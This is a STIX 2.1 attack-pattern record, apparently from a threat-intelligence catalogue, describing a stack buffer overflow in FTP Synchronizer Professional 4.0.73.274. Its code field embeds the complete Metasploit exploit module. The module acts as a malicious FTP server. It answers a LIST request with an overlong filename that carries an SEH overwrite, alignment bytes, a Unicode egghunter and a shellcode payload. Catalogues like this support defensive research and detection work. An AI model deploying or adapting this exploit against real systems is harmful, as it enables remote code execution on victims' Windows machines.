{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--c3c74103-3b6a-41d8-805f-001142dfe01f",
    "created": "2024-08-14T16:51:12.856508Z",
    "modified": "2024-08-14T16:51:12.856513Z",
    "name": "FTP Synchronizer Professional 4.0.73.274 Stack Buffer Overflow",
    "description": " This module exploits a stack buffer overflow vulnerability in FTP Synchronizer Pro version 4.0.73.274 The overflow gets triggered by sending an overly long filename to the client in response to a LIST command. The LIST command gets issued when doing a preview or when you have just created a new sync profile and allow the tool to see the differences. This will overwrite a structured exception handler and trigger an access violation. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/windows/ftp/ftpsynch_list_reply.rb",
            "external_id": "ftpsynch_list_reply.rb"
        },
        {
            "source_name": "reference",
            "url": "http://www.corelan.be:8800/index.php/2010/10/12/death-of-an-ftp-client/"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = GoodRanking\n\n  include Exploit::Remote::FtpServer\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'           => 'FTP Synchronizer Professional 4.0.73.274 Stack Buffer Overflow',\n      'Description'    => %q{\n          This module exploits a stack buffer overflow vulnerability in FTP Synchronizer Pro\n        version 4.0.73.274 The overflow gets triggered by sending an overly long filename to\n        the client in response to a LIST command.\n        The LIST command gets issued when doing a preview or when you have just created a new\n        sync profile and allow the tool to see the differences.\n        This will overwrite a structured exception handler and trigger an access violation.\n      },\n      'Author' \t =>\n        [\n          'myne-us',  \t#found the bug\n          'corelanc0d3r <peter.ve[at]corelan.be>'\t#wrote the exploit\n        ],\n      'License'        => MSF_LICENSE,\n      'References'     =>\n        [\n          [ 'URL', 'http://www.corelan.be:8800/index.php/2010/10/12/death-of-an-ftp-client/' ],\n        ],\n      'DefaultOptions' =>\n        {\n          'EXITFUNC' => 'thread',\n        },\n      'Payload'        =>\n        {\n          'BadChars' => \"\\x00\\x0a\\x2f\\x5c\",\n        },\n      'Platform'       => 'win',\n      'Targets'        =>\n        [\n          [ 'XP Universal', { 'Offset' => 854, 'Ret' => \"\\x2D\\x78\" } ], # p/p/r FTPSynchronizer.exe\n        ],\n      'Privileged'     => false,\n      'DisclosureDate' => '2010-10-12',\n      'DefaultTarget'  => 0))\n  end\n\n  def setup\n    super\n  end\n\n  def on_client_unknown_command(c,cmd,arg)\n    c.put(\"200 OK\\r\\n\")\n  end\n\n  def on_client_command_list(c,arg)\n    conn = establish_data_connection(c)\n    if(not conn)\n      c.put(\"425 Can't build data connection\\r\\n\")\n      return\n    end\n    print_status(\" - Data connection set up\")\n    code = 150\n    c.put(\"#{code} Here comes the directory listing.\\r\\n\")\n    code = 226\n    c.put(\"#{code} Directory send ok.\\r\\n\")\n    totalsize = 4000\n    foldername = \"A\" *  target['Offset']\n    nseh = \"\\x61\\x42\"\n    seh = \"\\x2D\\x78\"\n    sehpad = \"\\x44\\x62\"\n    align = \"\\x53\\x62\\x58\\x62\"\n    align << \"\\x40\\x62\"\n    align << \"\\x05\\x11\\x10\\x62\"\n    align << \"\\x2d\\x10\\x10\\x62\"\n    padding = (\"\\x42\\x62\" * 53) + (\"\\x48\\x62\")\n    #basereg EAX, Unicode encoded egghunter\n    hunter = \"PPYAIAIAIAIAQATAXAZAPA3QADAZ\"\n    hunter << \"ABARALAYAIAQAIAQAPA5AAAPAZ1AI1AIAIAJ11AIAIAX\"\n    hunter << \"A58AAPAZABABQI1AIQIAIQI1111AIAJQI1AYAZBABABA\"\n    hunter << \"BAB30APB944JBQVE1HJKOLOPB0RBJLBQHHMNNOLM5PZ4\"\n    hunter << \"4JO7H2WP0P0T4TKZZFOSEZJ6OT5K7KO9WA\"\n    buffer = foldername + nseh + seh + sehpad + align + padding + hunter\n    junk = \"D\" * (totalsize-buffer.length)\n    buffer << junk\n    print_status(\" - Sending directory list via data connection\")\n    dirlist =  \"drwxrwxrwx    1 100      0           11111 Jun 11 21:10 #{\"w00tw00t\"+payload.encoded}\\r\\n\"\n    dirlist << \"-rw-rw-r--    1 1176     1176         1060 Aug 16 22:22 #{buffer}\\r\\n\"\n    conn.put(\"total 2\\r\\n\"+dirlist)\n    print_status(\" - Payload sent, wait for hunter...\")\n    conn.close\n    return\n  end\nend\n",
    "x_mitre_disclosure_date": "2010-10-12",
    "x_mitre_platforms": [
        "win'"
    ]
}